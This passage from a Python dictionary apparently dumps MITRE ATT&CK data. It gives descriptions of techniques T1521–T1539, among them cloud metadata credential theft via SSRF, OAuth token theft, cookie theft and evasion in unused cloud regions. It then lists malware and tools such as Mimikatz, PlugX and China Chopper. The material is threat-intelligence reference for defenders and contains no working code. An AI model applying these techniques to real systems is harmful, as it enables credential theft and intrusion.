                          'domain names for command and control communication, and other uses such as malicious '
                          'application distribution.(Citation: securelist rotexy 2018)\n'
                          '\n'
                          'DGAs increase the difficulty for defenders to block, track, or take over the command and '
                          'control channel, as there potentially could be thousands of domains that malware can check '
                          'for instructions.',
           'name': 'Domain Generation Algorithms',
           'platforms': ['Android', 'iOS']},
 'T1521': {'attack_id': 'T1521',
           'categories': ['command-and-control'],
           'description': 'Adversaries may explicitly employ a known encryption algorithm to conceal command and '
                          'control traffic rather than relying on any inherent protections provided by a communication '
                          'protocol. Despite the use of a secure algorithm, these implementations may be vulnerable to '
                          'reverse engineering if necessary secret keys are encoded and/or generated within malware '
                          'samples/configuration files.',
           'name': 'Standard Cryptographic Protocol',
           'platforms': ['Android', 'iOS']},
 'T1522': {'attack_id': 'T1522',
           'categories': ['credential-access'],
           'description': 'Adversaries may attempt to access the Cloud Instance Metadata API to collect credentials '
                          'and other sensitive data.\n'
                          '\n'
                          'Most cloud service providers support a Cloud Instance Metadata API which is a service '
                          'provided to running virtual instances that allows applications to access information about '
                          'the running virtual instance. Available information generally includes name, security '
                          'group, and additional metadata including sensitive data such as credentials and UserData '
                          'scripts that may contain additional secrets. The Instance Metadata API is provided as a '
                          'convenience to assist in managing applications and is accessible by anyone who can access '
                          'the instance.(Citation: AWS Instance Metadata API)\n'
                          '\n'
                          'If adversaries have a presence on the running virtual instance, they may query the Instance '
                          'Metadata API directly to identify credentials that grant access to additional resources. '
                          'Additionally, attackers may exploit a Server-Side Request Forgery (SSRF) vulnerability in a '
                          'public facing web proxy that allows the attacker to gain access to the sensitive '
                          'information via a request to the Instance Metadata API.(Citation: RedLock Instance Metadata '
                          'API 2018)\n'
                          '\n'
                          'The de facto standard across cloud service providers is to host the Instance Metadata API '
                          'at <code>http[:]//169.254.169.254</code>.\n',
           'name': 'Cloud Instance Metadata API',
           'platforms': ['AWS', 'GCP', 'Azure']},
 'T1523': {'attack_id': 'T1523',
           'categories': ['defense-evasion', 'discovery'],
           'description': 'Malicious applications may attempt to detect their operating environment prior to fully '
                          'executing their payloads. These checks are often used to ensure the application is not '
                          'running within an analysis environment such as a sandbox used for application vetting, '
                          'security research, or reverse engineering. \n'
                          'Adversaries may use many different checks such as physical sensors, location, and system '
                          'properties to fingerprint emulators and sandbox environments.(Citation: Talos Gustuff Apr '
                          '2019)(Citation: ThreatFabric Cerberus)(Citation: Xiao-ZergHelper)(Citation: Cyberscoop '
                          'Evade Analysis January 2019) Adversaries may access `android.os.SystemProperties` via Java '
                          'reflection to obtain specific system information.(Citation: Github Anti-emulator) Standard '
                          'values such as phone number, IMEI, IMSI, device IDs, and device drivers may be checked '
                          'against default signatures of common sandboxes.(Citation: Sophos Anti-emulation)\n',
           'name': 'Evade Analysis Environment',
           'platforms': ['Android', 'iOS']},
 'T1525': {'attack_id': 'T1525',
           'categories': ['persistence'],
           'description': 'Amazon Web Service (AWS) Amazon Machine Images (AMI), Google Cloud Platform (GCP) Images, '
                          'and Azure Images as well as popular container runtimes such as Docker can be implanted or '
                          'backdoored to include malicious code. Depending on how the infrastructure is provisioned, '
                          'this could provide persistent access if the infrastructure provisioning tool is instructed '
                          'to always use the latest image.(Citation: Rhino Labs Cloud Image Backdoor Technique Sept '
                          '2019)\n'
                          '\n'
                          'A tool has been developed to facilitate planting backdoors in cloud container '
                          'images.(Citation: Rhino Labs Cloud Backdoor September 2019) If an attacker has access to a '
                          'compromised AWS instance, and permissions to list the available container images, they may '
                          'implant a backdoor such as a web shell.(Citation: Rhino Labs Cloud Image Backdoor Technique '
                          'Sept 2019) Adversaries may also implant Docker images that may be inadvertently used in '
                          'cloud deployments, which has been reported in some instances of cryptomining '
                          'botnets.(Citation: ATT Cybersecurity Cryptocurrency Attacks on Cloud) ',
           'name': 'Implant Container Image',
           'platforms': ['GCP', 'Azure', 'AWS']},
 'T1526': {'attack_id': 'T1526',
           'categories': ['discovery'],
           'description': 'An adversary may attempt to enumerate the cloud services running on a system after gaining '
                          "access. These methods can differ depending on if it's platform-as-a-service (PaaS), "
                          'infrastructure-as-a-service (IaaS), or software-as-a-service (SaaS). Many different '
                          'services exist throughout the various cloud providers and can include continuous '
                          'integration and continuous delivery (CI/CD), Lambda Functions, Azure AD, etc. Adversaries '
                          'may attempt to discover information about the services enabled throughout the environment.\n'
                          '\n'
                          'Pacu, an open source AWS exploitation framework, supports several methods for discovering '
                          'cloud services.(Citation: GitHub Pacu)',
           'name': 'Cloud Service Discovery',
           'platforms': ['AWS', 'GCP', 'Azure', 'Azure AD', 'Office 365', 'SaaS']},
 'T1527': {'attack_id': 'T1527',
           'categories': ['defense-evasion', 'lateral-movement'],
           'description': 'Adversaries may use application access tokens to bypass the typical authentication process '
                          'and access restricted accounts, information, or services on remote systems. These tokens '
                          'are typically stolen from users and used in lieu of login credentials.\n'
                          '\n'
                          'Application access tokens are used to make authorized API requests on behalf of a user and '
                          'are commonly used as a way to access resources in cloud-based applications and '
                          'software-as-a-service (SaaS).(Citation: Auth0 - Why You Should Always Use Access Tokens to '
                          'Secure APIs Sept 2019) OAuth is one commonly implemented framework that issues tokens to '
                          'users for access to systems. These frameworks are used collaboratively to verify the user '
                          'and determine what actions the user is allowed to perform. Once identity is established, '
                          'the token allows actions to be authorized, without passing the actual credentials of the '
                          'user. Therefore, compromise of the token can grant the adversary access to resources of '
                          'other sites through a malicious application.(Citation: okta)\n'
                          '\n'
                          'For example, with a cloud-based email service once an OAuth access token is granted to a '
                          'malicious application, it can potentially gain long-term access to features of the user '
                          'account if a "refresh" token enabling background access is awarded.(Citation: Microsoft '
                          'Identity Platform Access 2019) With an OAuth access token an adversary can use the '
                          'user-granted REST API to perform functions such as email searching and contact '
                          'enumeration.(Citation: Staaldraad Phishing with OAuth 2017)\n'
                          '\n'
                          'Compromised access tokens may be used as an initial step in compromising other services. '
                          'For example, if a token grants access to a victim’s primary email, the adversary may be '
                          'able to extend access to all other services which the target subscribes by triggering '
                          'forgotten password routines. Direct API access through a token negates the effectiveness of '
                          'a second authentication factor and may be immune to intuitive countermeasures like changing '
                          'passwords. Access abuse over an API channel can be difficult to detect even from the '
                          'service provider end, as the access can still align well with a legitimate workflow.\n',
           'name': 'Application Access Token',
           'platforms': ['SaaS', 'Office 365']},
 'T1528': {'attack_id': 'T1528',
           'categories': ['credential-access'],
           'description': 'Adversaries can steal user application access tokens as a means of acquiring credentials to '
                          'access remote systems and resources. This can occur through social engineering and '
                          'typically requires user action to grant access.\n'
                          '\n'
                          'Application access tokens are used to make authorized API requests on behalf of a user and '
                          'are commonly used as a way to access resources in cloud-based applications and '
                          'software-as-a-service (SaaS).(Citation: Auth0 - Why You Should Always Use Access Tokens to '
                          'Secure APIs Sept 2019) OAuth is one commonly implemented framework that issues tokens to '
                          'users for access to systems. An application desiring access to cloud-based services or '
                          'protected APIs can gain entry using OAuth 2.0 through a variety of authorization protocols. '
                          "An example commonly-used sequence is Microsoft's Authorization Code Grant flow.(Citation: "
                          'Microsoft Identity Platform Protocols May 2019)(Citation: Microsoft - OAuth Code '
                          'Authorization flow - June 2019) An OAuth access token enables a third-party application to '
                          'interact with resources containing user data in the ways requested by the application '
                          'without obtaining user credentials. \n'
                          ' \n'
                          'Adversaries can leverage OAuth authorization by constructing a malicious application '
                          "designed to be granted access to resources with the target user's OAuth token. The "
                          'adversary will need to complete registration of their application with the authorization '
                          'server, for example Microsoft Identity Platform using Azure Portal, the Visual Studio IDE, '
                          'the command-line interface, PowerShell, or REST API calls.(Citation: Microsoft - Azure AD '
                          'App Registration - May 2019) Then, they can send a link through [Spearphishing '
                          'Link](https://attack.mitre.org/techniques/T1192) to the target user to entice them to grant '
                          'access to the application. Once the OAuth access token is granted, the application can gain '
                          'potentially long-term access to features of the user account through [Application Access '
                          'Token](https://attack.mitre.org/techniques/T1527).(Citation: Microsoft - Azure AD Identity '
                          'Tokens - Aug 2019)\n'
                          '\n'
                          'Adversaries have been seen targeting Gmail, Microsoft Outlook, and Yahoo Mail '
                          'users.(Citation: Amnesty OAuth Phishing Attacks, August 2019)(Citation: Trend Micro Pawn '
                          'Storm OAuth 2017)',
           'name': 'Steal Application Access Token',
           'platforms': ['SaaS', 'Office 365', 'Azure AD']},
 'T1529': {'attack_id': 'T1529',
           'categories': ['impact'],
           'description': 'Adversaries may shutdown/reboot systems to interrupt access to, or aid in the destruction '
                          'of, those systems. Operating systems may contain commands to initiate a shutdown/reboot of '
                          'a machine. In some cases, these commands may also be used to initiate a shutdown/reboot of '
                          'a remote computer.(Citation: Microsoft Shutdown Oct 2017) Shutting down or rebooting '
                          'systems may disrupt access to computer resources for legitimate users.\n'
                          '\n'
                          'Adversaries may attempt to shutdown/reboot a system after impacting it in other ways, such '
                          'as [Disk Structure Wipe](https://attack.mitre.org/techniques/T1487) or [Inhibit System '
                          'Recovery](https://attack.mitre.org/techniques/T1490), to hasten the intended effects on '
                          'system availability.(Citation: Talos Nyetya June 2017)(Citation: Talos Olympic Destroyer '
                          '2018)',
           'name': 'System Shutdown/Reboot',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1530': {'attack_id': 'T1530',
           'categories': ['collection'],
           'description': 'Adversaries may access data objects from improperly secured cloud storage.\n'
                          '\n'
                          'Many cloud service providers offer solutions for online data storage such as Amazon S3, '
                          'Azure Storage, and Google Cloud Storage. These solutions differ from other storage '
                          'solutions (such as SQL or Elasticsearch) in that there is no overarching application. Data '
                          "from these solutions can be retrieved directly using the cloud provider's APIs. Solution "
                          'providers typically offer security guides to help end users configure systems.(Citation: '
                          'Amazon S3 Security, 2019)(Citation: Microsoft Azure Storage Security, 2019)(Citation: '
                          'Google Cloud Storage Best Practices, 2019)\n'
                          '\n'
                          'Misconfiguration by end users is a common problem. There have been numerous incidents where '
                          'cloud storage has been improperly secured (typically by unintentionally allowing public '
                          'access by unauthenticated users or overly-broad access by all users), allowing open access '
                          'to credit cards, personally identifiable information, medical records, and other sensitive '
                          'information.(Citation: Trend Micro S3 Exposed PII, 2017)(Citation: Wired Magecart S3 '
                          'Buckets, 2019)(Citation: HIPAA Journal S3 Breach, 2017) Adversaries may also obtain leaked '
                          'credentials in source repositories, logs, or other means as a way to gain access to cloud '
                          'storage objects that have access permission controls.',
           'name': 'Data from Cloud Storage Object',
           'platforms': ['AWS', 'GCP', 'Azure']},
 'T1531': {'attack_id': 'T1531',
           'categories': ['impact'],
           'description': 'Adversaries may interrupt availability of system and network resources by inhibiting access '
                          'to accounts utilized by legitimate users. Accounts may be deleted, locked, or manipulated '
                          '(ex: changed credentials) to remove access to accounts.\n'
                          '\n'
                          'Adversaries may also subsequently log off and/or reboot boxes to set malicious changes into '
                          'place.(Citation: CarbonBlack LockerGoga 2019)(Citation: Unit42 LockerGoga 2019)',
           'name': 'Account Access Removal',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1532': {'attack_id': 'T1532',
           'categories': ['exfiltration'],
           'description': 'Data is encrypted before being exfiltrated in order to hide the information that is being '
                          'exfiltrated from detection or to make the exfiltration less conspicuous upon inspection by '
                          'a defender. The encryption is performed by a utility, programming library, or custom '
                          'algorithm on the data itself and is considered separate from any encryption performed by '
                          'the command and control or file transfer protocol. Common file formats that can encrypt '
                          'files are RAR and zip.',
           'name': 'Data Encrypted',
           'platforms': ['Android', 'iOS']},
 'T1533': {'attack_id': 'T1533',
           'categories': ['collection'],
           'description': 'Sensitive data can be collected from local system sources, such as the file system or '
                          'databases of information residing on the system.\n'
                          '\n'
                          'Local system data includes information stored by the operating system. Access to local '
                          'system data often requires escalated privileges (e.g. root access). Examples of local '
                          'system data include authentication tokens, the device keyboard cache, Wi-Fi passwords, and '
                          'photos.',
           'name': 'Data from Local System',
           'platforms': ['Android', 'iOS']},
 'T1534': {'attack_id': 'T1534',
           'categories': ['lateral-movement'],
           'description': 'Adversaries may use internal spearphishing to gain access to additional information or '
                          'exploit other users within the same organization after they already have access to accounts '
                          'or systems within the environment. Internal spearphishing is multi-staged attack where an '
                          "email account is owned either by controlling the user's device with previously installed "
                          'malware or by compromising the account credentials of the user. Adversaries attempt to take '
                          'advantage of a trusted internal account to increase the likelihood of tricking the target '
                          'into falling for the phish attempt.(Citation: Trend Micro When Phishing Starts from the '
                          'Inside 2017)\n'
                          '\n'
                          'Adversaries may leverage [Spearphishing '
                          'Attachment](https://attack.mitre.org/techniques/T1193) or [Spearphishing '
                          'Link](https://attack.mitre.org/techniques/T1192) as part of internal spearphishing to '
                          'deliver a payload or redirect to an external site to capture credentials through [Input '
                          'Capture](https://attack.mitre.org/techniques/T1056) on sites that mimic email login '
                          'interfaces.\n'
                          '\n'
                          'There have been notable incidents where internal spearphishing has been used. The Eye '
                          'Pyramid campaign used phishing emails with malicious attachments for lateral movement '
                          'between victims, compromising nearly 18,000 email accounts in the process.(Citation: Trend '
                          'Micro When Phishing Starts from the Inside 2017) The Syrian Electronic Army (SEA) '
                          'compromised email accounts at the Financial Times (FT) to steal additional account '
                          'credentials. Once FT learned of the attack and began warning employees of the threat, the '
                          'SEA sent phishing emails mimicking the Financial Times IT department and were able to '
                          'compromise even more users.(Citation: THE FINANCIAL TIMES LTD 2019.)',
           'name': 'Internal Spearphishing',
           'platforms': ['Windows', 'macOS', 'Linux', 'Office 365', 'SaaS']},
 'T1535': {'attack_id': 'T1535',
           'categories': ['defense-evasion'],
           'description': 'Adversaries may create cloud instances in unused geographic service regions in order to '
                          'evade detection. Access is usually obtained through compromising accounts used to manage '
                          'cloud infrastructure.\n'
                          '\n'
                          'Cloud service providers often provide infrastructure throughout the world in order to '
                          'improve performance, provide redundancy, and allow customers to meet compliance '
                          'requirements. Oftentimes, a customer will only use a subset of the available regions and '
                          'may not actively monitor other regions. If an adversary creates resources in an unused '
                          'region, they may be able to operate undetected.\n'
                          '\n'
                          'A variation on this behavior takes advantage of differences in functionality across cloud '
                          'regions. An adversary could utilize regions which do not support advanced detection '
                          'services in order to avoid detection of their activity. For example, AWS GuardDuty is not '
                          'supported in every region.(Citation: AWS Region Service Table)\n'
                          '\n'
                          'An example of adversary use of unused AWS regions is to mine cryptocurrency through '
                          '[Resource Hijacking](https://attack.mitre.org/techniques/T1496), which can cost '
                          'organizations substantial amounts of money over time depending on the processing power '
                          'used.(Citation: CloudSploit - Unused AWS Regions)',
           'name': 'Unused/Unsupported Cloud Regions',
           'platforms': ['AWS', 'GCP', 'Azure']},
 'T1536': {'attack_id': 'T1536',
           'categories': ['defense-evasion'],
           'description': 'An adversary may revert changes made to a cloud instance after they have performed '
                          'malicious activities in attempt to evade detection and remove evidence of their presence. '
                          'In highly virtualized environments, such as cloud-based infrastructure, this may be easily '
                          'facilitated using restoration from VM or data storage snapshots through the cloud '
                          'management dashboard. Another variation of this technique is to utilize temporary storage '
                          'attached to the compute instance. Most cloud providers provide various types of storage '
                          'including persistent, local, and/or ephemeral, with the latter types often reset upon '
                          'stop/restart of the VM.(Citation: Tech Republic - Restore AWS Snapshots)(Citation: Google - '
                          'Restore Cloud Snapshot)',
           'name': 'Revert Cloud Instance',
           'platforms': ['AWS', 'GCP', 'Azure']},
 'T1537': {'attack_id': 'T1537',
           'categories': ['exfiltration'],
           'description': 'An adversary may exfiltrate data by transferring the data, including backups of cloud '
                          'environments, to another cloud account they control on the same service to avoid typical '
                          'file transfers/downloads and network-based exfiltration detection.\n'
                          '\n'
                          'A defender who is monitoring for large transfers to outside the cloud environment through '
                          'normal file transfers or over command and control channels may not be watching for data '
                          'transfers to another account within the same cloud provider. Such transfers may utilize '
                          'existing cloud provider APIs and the internal address space of the cloud provider to blend '
                          'into normal traffic or avoid data transfers over external network interfaces.\n'
                          '\n'
                          'Incidents have been observed where adversaries have created backups of cloud instances and '
                          'transferred them to separate accounts.(Citation: DOJ GRU Indictment Jul 2018) ',
           'name': 'Transfer Data to Cloud Account',
           'platforms': ['Azure', 'AWS', 'GCP']},
 'T1538': {'attack_id': 'T1538',
           'categories': ['discovery'],
           'description': 'An adversary may use a cloud service dashboard GUI with stolen credentials to gain useful '
                          'information from an operational cloud environment, such as specific services, resources, '
                          'and features. For example, the GCP Command Center can be used to view all assets, findings '
                          'of potential security risks, and to run additional queries, such as finding public IP '
                          'addresses and open ports.(Citation: Google Command Center Dashboard)\n'
                          '\n'
                          'Depending on the configuration of the environment, an adversary may be able to enumerate '
                          'more information via the graphical dashboard than an API. This allows the adversary to gain '
                          'information without making any API requests.',
           'name': 'Cloud Service Dashboard',
           'platforms': ['AWS', 'GCP', 'Azure', 'Azure AD', 'Office 365']},
 'T1539': {'attack_id': 'T1539',
           'categories': ['credential-access'],
           'description': 'An adversary may steal web application or service session cookies and use them to gain '
                          'access web applications or Internet services as an authenticated user without needing '
                          'credentials. Web applications and services often use session cookies as an authentication '
                          'token after a user has authenticated to a website.\n'
                          '\n'
                          'Cookies are often valid for an extended period of time, even if the web application is not '
                          'actively used. Cookies can be found on disk, in the process memory of the browser, and in '
                          'network traffic to remote systems. Additionally, other applications on the targets machine '
                          'might store sensitive authentication cookies in memory (e.g. apps which authenticate to '
                          'cloud services). Session cookies can be used to bypasses some multi-factor authentication '
                          'protocols.(Citation: Pass The Cookie)\n'
                          '\n'
                          'There are several examples of malware targeting cookies from web browsers on the local '
                          'system.(Citation: Kaspersky TajMahal April 2019)(Citation: Unit 42 Mac Crypto Cookies '
                          'January 2019) There are also open source frameworks such as Evilginx 2 and Mauraena that '
                          'can gather session cookies through a man-in-the-middle proxy that can be set up by an '
                          'adversary and used in phishing campaigns.(Citation: Github evilginx2)(Citation: GitHub '
                          'Mauraena)\n'
                          '\n'
                          'After an adversary acquires a valid cookie, they can then perform a [Web Session '
                          'Cookie](https://attack.mitre.org/techniques/T1506) technique to login to the corresponding '
                          'web application.',
           'name': 'Steal Web Session Cookie',
           'platforms': ['Linux', 'macOS', 'Windows', 'Office 365', 'SaaS']}
}

software_map = {
 'S0001': {'attack_ids': ['T1019'],
           'description': '[Trojan.Mebromi](https://attack.mitre.org/software/S0001) is BIOS-level malware that takes '
                          'control of the victim before MBR. (Citation: Ge 2011)',
           'name': 'Trojan.Mebromi',
           'platforms': ['Windows'],
           'software_id': 'S0001',
           'type': 'malware'},
 'S0002': {'attack_ids': ['T1098', 'T1178', 'T1207', 'T1003', 'T1145', 'T1081', 'T1101', 'T1097', 'T1075'],
           'description': '[Mimikatz](https://attack.mitre.org/software/S0002) is a credential dumper capable of '
                          'obtaining plaintext Windows account logins and passwords, along with many other features '
                          'that make it useful for testing the security of networks. (Citation: Deply Mimikatz) '
                          '(Citation: Adsecurity Mimikatz Guide)',
           'name': 'Mimikatz',
           'platforms': ['Windows'],
           'software_id': 'S0002',
           'type': 'tool'},
 'S0003': {'attack_ids': ['T1032', 'T1071', 'T1043'],
           'description': '[RIPTIDE](https://attack.mitre.org/software/S0003) is a proxy-aware backdoor used by '
                          '[APT12](https://attack.mitre.org/groups/G0005). (Citation: Moran 2014)',
           'name': 'RIPTIDE',
           'platforms': ['Windows'],
           'software_id': 'S0003',
           'type': 'malware'},
 'S0004': {'attack_ids': ['T1056', 'T1059', 'T1060', 'T1113', 'T1089', 'T1050', 'T1115', 'T1023'],
           'description': '[TinyZBot](https://attack.mitre.org/software/S0004) is a bot written in C# that was '
                          'developed by [Cleaver](https://attack.mitre.org/groups/G0003). (Citation: Cylance Cleaver)',
           'name': 'TinyZBot',
           'platforms': ['Windows'],
           'software_id': 'S0004',
           'type': 'malware'},
 'S0005': {'attack_ids': ['T1003'],
           'description': '[Windows Credential Editor](https://attack.mitre.org/software/S0005) is a password dumping '
                          'tool. (Citation: Amplia WCE)',
           'name': 'Windows Credential Editor',
           'platforms': ['Windows'],
           'software_id': 'S0005',
           'type': 'tool'},
 'S0006': {'attack_ids': ['T1003'],
           'description': '[pwdump](https://attack.mitre.org/software/S0006) is a credential dumper. (Citation: '
                          'Wikipedia pwdump)',
           'name': 'pwdump',
           'platforms': ['Windows'],
           'software_id': 'S0006',
           'type': 'tool'},
 'S0007': {'attack_ids': ['T1098'],
           'description': '[Skeleton Key](https://attack.mitre.org/software/S0007) is malware used to inject false '
                          'credentials into domain controllers with the intent of creating a backdoor password. '
                          '(Citation: Dell Skeleton) Functionality similar to [Skeleton '
                          'Key](https://attack.mitre.org/software/S0007) is included as a module in '
                          '[Mimikatz](https://attack.mitre.org/software/S0002).',
           'name': 'Skeleton Key',
           'platforms': ['Windows'],
           'software_id': 'S0007',
           'type': 'malware'},
 'S0008': {'attack_ids': ['T1003'],
           'description': '[gsecdump](https://attack.mitre.org/software/S0008) is a publicly-available credential '
                          'dumper used to obtain password hashes and LSA secrets from Windows operating systems. '
                          '(Citation: TrueSec Gsecdump)',
           'name': 'gsecdump',
           'platforms': ['Windows'],
           'software_id': 'S0008',
           'type': 'tool'},
 'S0009': {'attack_ids': ['T1090', 'T1024'],
           'description': '[Hikit](https://attack.mitre.org/software/S0009) is malware that has been used by '
                          '[Axiom](https://attack.mitre.org/groups/G0001) for late-stage persistence and exfiltration '
                          'after the initial compromise. (Citation: Novetta-Axiom)',
           'name': 'Hikit',
           'platforms': ['Windows'],
           'software_id': 'S0009',
           'type': 'malware'},
 'S0010': {'attack_ids': ['T1002', 'T1024'],
           'description': '[Lurid](https://attack.mitre.org/software/S0010) is a malware family that has been used by '
                          'several groups, including [PittyTiger](https://attack.mitre.org/groups/G0011), in targeted '
                          'attacks as far back as 2006. (Citation: Villeneuve 2014) (Citation: Villeneuve 2011)',
           'name': 'Lurid',
           'platforms': ['Windows'],
           'software_id': 'S0010',
           'type': 'malware'},
 'S0011': {'attack_ids': ['T1024', 'T1055'],
           'description': '[Taidoor](https://attack.mitre.org/software/S0011) is malware that has been used since at '
                          'least 2010, primarily to target Taiwanese government organizations. (Citation: TrendMicro '
                          'Taidoor)',
           'name': 'Taidoor',
           'platforms': ['Windows'],
           'software_id': 'S0011',
           'type': 'malware'},
 'S0012': {'attack_ids': ['T1010',
                          'T1027',
                          'T1055',
                          'T1074',
                          'T1032',
                          'T1112',
                          'T1014',
                          'T1056',
                          'T1060',
                          'T1005',
                          'T1105',
                          'T1065',
                          'T1050',
                          'T1031',
                          'T1059'],
           'description': '[PoisonIvy](https://attack.mitre.org/software/S0012) is a popular remote access tool (RAT) '
                          'that has been used by many groups. (Citation: FireEye Poison Ivy) (Citation: Symantec '
                          'Elderwood Sept 2012) (Citation: Symantec Darkmoon Aug 2005)',
           'name': 'PoisonIvy',
           'platforms': ['Windows'],
           'software_id': 'S0012',
           'type': 'malware'},
 'S0013': {'attack_ids': ['T1095',
                          'T1094',
                          'T1106',
                          'T1026',
                          'T1140',
                          'T1059',
                          'T1056',
                          'T1073',
                          'T1036',
                          'T1102',
                          'T1012',
                          'T1050',
                          'T1031',
                          'T1127',
                          'T1057',
                          'T1135',
                          'T1083',
                          'T1497',
                          'T1105',
                          'T1071',
                          'T1112',
                          'T1113',
                          'T1043',
                          'T1060',
                          'T1049'],
           'description': '[PlugX](https://attack.mitre.org/software/S0013) is a remote access tool (RAT) that uses '
                          'modular plugins. It has been used by multiple threat groups. (Citation: Lastline PlugX '
                          'Analysis) (Citation: FireEye Clandestine Fox Part 2) (Citation: New DragonOK) (Citation: '
                          'Dell TG-3390)',
           'name': 'PlugX',
           'platforms': ['Windows'],
           'software_id': 'S0013',
           'type': 'malware'},
 'S0014': {'attack_ids': ['T1132'],
           'description': '[BS2005](https://attack.mitre.org/software/S0014) is malware that was used by '
                          '[Ke3chang](https://attack.mitre.org/groups/G0004) in spearphishing campaigns since at least '
                          '2011. (Citation: Villeneuve et al 2014)',
           'name': 'BS2005',
           'platforms': ['Windows'],
           'software_id': 'S0014',
           'type': 'malware'},
 'S0015': {'attack_ids': ['T1071',
                          'T1107',
                          'T1016',
                          'T1082',
                          'T1007',
                          'T1060',
                          'T1057',
                          'T1043',
                          'T1036',
                          'T1005',
                          'T1001',
                          'T1083',
                          'T1033',
                          'T1105',
                          'T1158',
                          'T1059'],
           'description': '[Ixeshe](https://attack.mitre.org/software/S0015) is a malware family that has been used '
                          'since at least 2009 against targets in East Asia. (Citation: Moran 2013)',
           'name': 'Ixeshe',
           'platforms': ['Windows'],
           'software_id': 'S0015',
           'type': 'malware'},
 'S0016': {'attack_ids': ['T1001'],
           'description': '[P2P ZeuS](https://attack.mitre.org/software/S0016) is a closed-source fork of the leaked '
                          'version of the ZeuS botnet. It presents improvements over the leaked version, including a '
                          'peer-to-peer architecture. (Citation: Dell P2P ZeuS)',
           'name': 'P2P ZeuS',
           'platforms': ['Windows'],
           'software_id': 'S0016',
           'type': 'malware'},
 'S0017': {'attack_ids': ['T1094', 'T1056', 'T1032', 'T1082', 'T1008', 'T1113', 'T1057', 'T1033', 'T1105', 'T1059'],
           'description': '[BISCUIT](https://attack.mitre.org/software/S0017) is a backdoor that has been used by '
                          '[APT1](https://attack.mitre.org/groups/G0006) since as early as 2007. (Citation: Mandiant '
                          'APT1)',
           'name': 'BISCUIT',
           'platforms': ['Windows'],
           'software_id': 'S0017',
           'type': 'malware'},
 'S0018': {'attack_ids': ['T1018',
                          'T1016',
                          'T1111',
                          'T1055',
                          'T1056',
                          'T1087',
                          'T1007',
                          'T1060',
                          'T1057',
                          'T1079',
                          'T1049'],
           'description': '[Sykipot](https://attack.mitre.org/software/S0018) is malware that has been used in '
                          'spearphishing campaigns since approximately 2007 against victims primarily in the US. One '
                          'variant of [Sykipot](https://attack.mitre.org/software/S0018) hijacks smart cards on '
                          'victims. (Citation: Alienvault Sykipot DOD Smart Cards) The group using this malware has '
                          'also been referred to as Sykipot. (Citation: Blasco 2013)',
           'name': 'Sykipot',
           'platforms': ['Windows'],
           'software_id': 'S0018',
           'type': 'malware'},
 'S0019': {'attack_ids': ['T1095', 'T1071', 'T1077', 'T1040', 'T1094', 'T1112', 'T1056', 'T1090', 'T1096', 'T1116'],
           'description': '[Regin](https://attack.mitre.org/software/S0019) is a malware platform that has targeted '
                          'victims in a range of industries, including telecom, government, and financial '
                          'institutions. Some [Regin](https://attack.mitre.org/software/S0019) timestamps date back to '
                          '2003. (Citation: Kaspersky Regin)',
           'name': 'Regin',
           'platforms': ['Windows'],
           'software_id': 'S0019',
           'type': 'malware'},
 'S0020': {'attack_ids': ['T1110',
                          'T1071',
                          'T1005',
                          'T1045',
                          'T1100',
                          'T1046',
                          'T1064',
                          'T1083',
                          'T1099',
                          'T1105',
                          'T1059'],
           'description': '[China Chopper](https://attack.mitre.org/software/S0020) is a [Web '
                          'Shell](https://attack.mitre.org/techniques/T1100) hosted on Web servers to provide access '
                          'back into an enterprise network that does not rely on an infected system calling back to a '
                          'remote command and control server. (Citation: Lee 2013) It has been used by several threat '
                          'groups. (Citation: Dell TG-3390) (Citation: FireEye Periscope March 2018)',
           'name': 'China Chopper',
           'platforms': ['Windows'],
           'software_id': 'S0020',
           'type': 'malware'},
 'S0021': {'attack_ids': ['T1095',
                          'T1094',
                          'T1024',
                          'T1055',
                          'T1117',
                          'T1059',
                          'T1056',
                          'T1082',
                          'T1012',
                          'T1099',
                          'T1107',
                          'T1125',
                          'T1057',
                          'T1123',
                          'T1083',
                          'T1008',
                          'T1113',
                          'T1043',
                          'T1033'],
           'description': '[Derusbi](https://attack.mitre.org/software/S0021) is malware used by multiple Chinese APT '
                          'groups. (Citation: Novetta-Axiom) (Citation: ThreatConnect Anthem) Both Windows and Linux '
                          'variants have been observed. (Citation: Fidelis Turbo)',
           'name': 'Derusbi',
           'platforms': ['Windows', 'Linux'],
           'software_id': 'S0021',
           'type': 'malware'},
 'S0022': {'attack_ids': ['T1045', 'T1014'],
           'description': '[Uroburos](https://attack.mitre.org/software/S0022) is a rootkit used by '
                          '[Turla](https://attack.mitre.org/groups/G0010). (Citation: Kaspersky Turla)',
           'name': 'Uroburos',
           'platforms': ['Windows'],
           'software_id': 'S0022',
           'type': 'malware'},
 'S0023': {'attack_ids': ['T1071',
                          'T1063',
                          'T1112',
                          'T1483',
                          'T1032',
                          'T1056',
                          'T1090',
                          'T1091',
                          'T1092',
                          'T1008',
                          'T1113',
                          'T1083',
                          'T1012',
                          'T1497',
                          'T1105',
                          'T1059'],
           'description': '[CHOPSTICK](https://attack.mitre.org/software/S0023) is a malware family of modular '
                          'backdoors used by [APT28](https://attack.mitre.org/groups/G0007). It has been used since at '
                          'least 2012 and is usually dropped on victims as second-stage malware, though it has been '
                          'used as first-stage malware in several cases. It has both Windows and Linux variants. '
                          '(Citation: FireEye APT28) (Citation: ESET Sednit Part 2) (Citation: FireEye APT28 January '
                          '2017) (Citation: DOJ GRU Indictment Jul 2018) It is tracked separately from the [X-Agent '
                          'for Android](https://attack.mitre.org/software/S0314).',
           'name': 'CHOPSTICK',
           'platforms': ['Windows', 'Linux'],
           'software_id': 'S0023',
           'type': 'malware'},
 'S0024': {'attack_ids': ['T1140', 'T1071', 'T1055', 'T1050', 'T1105', 'T1497'],
           'description': '[Dyre](https://attack.mitre.org/software/S0024) is a Trojan that has been used for '
                          'financial gain. \n'
                          ' (Citation: Symantec Dyre June 2015)',
           'name': 'Dyre',
           'platforms': ['Windows'],
           'software_id': 'S0024',
           'type': 'malware'},
 'S0025': {'attack_ids': ['T1102', 'T1059'],
           'description': '[CALENDAR](https://attack.mitre.org/software/S0025) is malware used by '
                          '[APT1](https://attack.mitre.org/groups/G0006) that mimics legitimate Gmail Calendar '
                          'traffic. (Citation: Mandiant APT1)',
           'name': 'CALENDAR',
           'platforms': ['Windows'],
           'software_id': 'S0025',
           'type': 'malware'},
 'S0026': {'attack_ids': ['T1102'],
           'description': '[GLOOXMAIL](https://attack.mitre.org/software/S0026) is malware used by '
                          '[APT1](https://attack.mitre.org/groups/G0006) that mimics legitimate Jabber/XMPP traffic. '
                          '(Citation: Mandiant APT1)',
           'name': 'GLOOXMAIL',
